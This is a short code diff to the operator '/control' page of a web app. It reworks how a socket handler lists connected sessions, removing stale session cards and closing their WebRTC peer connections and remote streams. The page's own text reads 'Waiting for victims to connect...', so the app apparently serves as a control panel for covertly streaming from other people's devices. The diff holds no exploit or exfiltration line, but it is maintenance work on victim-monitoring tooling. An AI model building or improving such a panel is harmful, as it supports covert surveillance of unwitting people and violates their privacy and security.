@@ -197,13 +197,30 @@ app.get('/control', (req, res) => {
     });
 
     socket.on('session-list', function(sessions) {
-      sessionList.innerHTML = '';
       sessionCount.textContent = sessions.length;
 
-      if (sessions.length === 0) {
-        sessionList.innerHTML = '<div class="no-sessions">🔴 Waiting for victims to connect...</div>';
+      if (sessions.length === 0 && sessionList.children.length === 0) {
+        sessionList.innerHTML = '<div class="no-sessions" id="noSessionsMsg">🔴 Waiting for victims to connect...</div>';
         return;
+      } else if (sessions.length > 0) {
+        const noSess = document.getElementById('noSessionsMsg');
+        if (noSess) noSess.remove();
       }
+
+      // Remove cards that are no longer in the active sessions list
+      Array.from(sessionList.children).forEach(child => {
+        if (child.id && child.id.startsWith('card-')) {
+          const sid = child.id.replace('card-', '');
+          if (!sessions.includes(sid)) {
+            child.remove();
+            if (peerConnections[sid]) {
+              peerConnections[sid].close();
+              delete peerConnections[sid];
+              delete remoteStreams[sid];
+            }
+          }
+        }
+      });
 
       sessions.forEach(sid => {
         if (document.getElementById('card-' + sid)) return;
